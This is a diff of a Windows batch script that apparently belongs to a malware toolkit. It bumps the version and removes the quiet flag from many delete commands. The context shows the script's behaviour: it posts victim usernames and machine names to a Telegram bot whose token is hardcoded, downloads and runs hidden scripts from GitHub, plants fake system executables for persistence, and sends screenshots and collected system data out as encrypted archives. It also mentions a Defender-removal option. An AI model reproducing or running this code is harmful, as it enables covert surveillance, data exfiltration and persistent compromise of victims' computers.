@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=25.3"
+set "BATCHVERSION=25.4"
 
 
 
@@ -86,13 +86,13 @@ set "LOGFILE=%temp%\!filename1!.mpeez"
 
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
-del /f /q /a "%LOGFILE%"
+del /f /a "%LOGFILE%"
 echo.
 echo.
 echo Exiting...
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
-del /f /q /a %temp%\*.mpee
-del /f /q /a %temp%\*.qwb
+del /f /a %temp%\*.mpee
+del /f /a %temp%\*.qwb
 goto :EOF
 
 :LogOutput
@@ -161,7 +161,7 @@ set "filename="
 
 
 set "InstalledQWB=%temp%\!filename2!.qwb"
-del /f /q /a "%InstalledQWB%"
+del /f /a "%InstalledQWB%"
 
 
 
@@ -384,7 +384,7 @@ if not exist "%startupFile%" (
     echo File is already in %startupFile%.
 )
 
-del /f /q /a "%appdata%\*.ps1"
+del /f /a "%appdata%\*.ps1"
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
 
@@ -629,7 +629,7 @@ echo Going to SHSTINSTALL...
 :: Run commands if ShellHost.exe is not found
 echo Checking for ShellHost...
 set "embeddedScript=%temp%\temp_script_SHST.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 
@@ -640,7 +640,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -748,11 +748,11 @@ echo.
 
 
 echo Deleting %KMSFILEroot% and %KMSFILE%
-del /f /q /a "%KMSFILEroot%"
+del /f /a "%KMSFILEroot%"
 echo Killing process KMSAuto by Powershell
 powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
 taskkill /F /IM KMSAuto.exe
-del /f /q /a "%KMSFILE%"
+del /f /a "%KMSFILE%"
 echo ATTRIB OF KMSAUTO
 attrib "%KMSFILE%"
 echo.
@@ -784,7 +784,7 @@ echo Going to KMSINSTALL...
 :: Run commands if KMSAuto.exe is not found
 echo Checking for KMSAuto...
 set "embeddedScript=%temp%\temp_script_KMS.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
@@ -793,7 +793,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -852,7 +852,7 @@ if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
 :: Run commands if ComSurrogate.exe is not found
 echo Checking for COM Surrogate...
 set "embeddedScript=%temp%\temp_script_COM.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -862,7 +862,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -928,7 +928,7 @@ if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
 :: Run commands if CoreWorkerProcess.exe is not found
 echo Checking for CoreWorkerProcess...
 set "embeddedScript=%temp%\temp_script_CWP.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -938,7 +938,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -996,7 +996,7 @@ if exist "%APPDATA%\Microsoft\7z.dll" (
 :: Run commands if Nircmd.exe is not found
 echo Checking for 7z...
 set "embeddedScript=%temp%\temp_script_7z.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -1006,7 +1006,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -1053,7 +1053,7 @@ if exist "%APPDATA%\Microsoft\nircmd.exe" (
 :: Run commands if Nircmd.exe is not found
 echo Checking for Nircmd...
 set "embeddedScript=%temp%\temp_script_Nircmd.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -1063,7 +1063,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -1108,7 +1108,7 @@ if exist "%file9%" (
 :: Run commands if handle.exe is not found
 echo Checking for handle...
 set "embeddedScript=%temp%\temp_script_handle.bat"
-del /f /q /a "%embeddedScript%"
+del /f /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -1118,7 +1118,7 @@ attrib +h +s "%embeddedScript%"
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del /f /q /a "%embeddedScript%"
+    del /f /a "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -1422,7 +1422,7 @@ echo All running processes - Using Powershell - >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%ProcessTXTFILE%" >> "%InstalledQWB%"
-del /f /q /a "%ProcessTXTFILE%"
+del /f /a "%ProcessTXTFILE%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1476,7 +1476,7 @@ echo Task Scheduler :  >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%TASKS_DATA%" >> "%InstalledQWB%"
-del /f /q /a "%TASKS_DATA%"
+del /f /a "%TASKS_DATA%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1529,19 +1529,19 @@ taskkill /F /IM StartupTaskCaller.exe
 
 
 echo Deleting files...
-del /F /Q /A "%SystemRoot%\System32\TSSPrxy.exe"
-del /F /Q /A "%SystemRoot%\System32\TSSPrxyAd.exe"
-del /F /Q /A "%SystemRoot%\System32\TSSPrxySTC.exe"
-del /F /Q /A "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
-del /F /Q /A "%SystemRoot%\System32\TSSPrxyRNTM.exe"
-del /F /Q /A "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
-del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
-del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
-del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
-del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
-del /F /Q /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
-del /F /Q /A "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-del /F /Q /A "%file6%"
+del /F /A "%SystemRoot%\System32\TSSPrxy.exe"
+del /F /A "%SystemRoot%\System32\TSSPrxyAd.exe"
+del /F /A "%SystemRoot%\System32\TSSPrxySTC.exe"
+del /F /A "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
+del /F /A "%SystemRoot%\System32\TSSPrxyRNTM.exe"
+del /F /A "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
+del /F /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
+del /F /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
+del /F /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+del /F /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+del /F /A "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+del /F /A "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+del /F /A "%file6%"
 
 
 echo Operation completed.
@@ -1578,7 +1578,7 @@ echo.
 cls
 :: Kill & Delete
 taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q /a "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+del /f /a "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
 echo.
 echo You chose WinDefRemover.
@@ -1911,7 +1911,7 @@ echo.
 :: make x empty lines to %LOGFILE1% then type taask scheduler .....
 (for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
 type "%InstalledQWB%" >> "%LOGFILE1%"
-del /f /q /a "%InstalledQWB%"
+del /f /a "%InstalledQWB%"
 echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
@@ -1970,7 +1970,7 @@ set "File2=%LOGFILE1%"
 echo Compressing Files
 "%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
 if exist "%ZIP_FILE%" echo File Compressed successfuly.
-del /f /q /a "%LOGFILE1%"
+del /f /a "%LOGFILE1%"
 echo.
 echo.
 
@@ -1990,13 +1990,13 @@ set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
 set "LOGSTLR=%temp%\LGSTLRR.ever"
 
 rem Delete existing ZIP file to ensure fresh compression
-if exist "%ZIP_FILEMS%" del /f /q /a "%ZIP_FILEMS%"
+if exist "%ZIP_FILEMS%" del /f /a "%ZIP_FILEMS%"
 echo Deleted.
 
 echo.
 echo.
 
-del /f /q /a "%LOGSTLR%"
+del /f /a "%LOGSTLR%"
 goto PEROTY
 type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
 echo. >> "%LOGSTLR%"
@@ -2040,7 +2040,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
      -F "document=@%ZIP_FILE%"
 
-del /f /q /a "%ZIP_FILE%"
+del /f /a "%ZIP_FILE%"
 
 goto PEROTY1
 
@@ -2068,8 +2068,8 @@ echo Sent.
 set "currentMinute=%time:~3,2%"
 
 
-del /f /q /a "%InstalledQWB%"
-del /f /q /a "%USERPROFILE%\Downloads\screenshot.png"
+del /f /a "%InstalledQWB%"
+del /f /a "%USERPROFILE%\Downloads\screenshot.png"
 
 
 
@@ -2152,7 +2152,7 @@ for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
 echo.
 echo.
 :: Cleanup
-del /f /q /a chldrocess.txt
+del /f /a chldrocess.txt
 echo.
 echo All child processes terminated.
 
